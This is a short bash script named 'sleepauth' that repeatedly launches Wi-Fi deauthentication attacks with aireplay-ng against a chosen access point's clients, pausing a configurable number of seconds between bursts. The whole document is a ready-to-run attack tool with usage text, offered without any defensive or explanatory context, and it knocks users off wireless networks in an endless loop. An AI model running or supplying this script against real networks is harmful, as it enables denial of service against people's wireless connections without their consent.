#!/usr/bin/bash

#title|sleepauth
#version|0.1
#author|0ero1ne 
#info|deauth AP's clients with timeout

if [[ $# -eq 4 ]]; then
	while true; do
		printf "%s\n" "[*] Launching attack..."
		sudo aireplay-ng -0 $1 -a $2 $4 1>/dev/null

		printf "%s\n\n" "[*] Waiting $3 seconds..."
		sleep $3
	done
else
	printf "%s\n" "[X] ./sleepauth.sh <packets> <BSSID> <timeout> <imon>"
fi
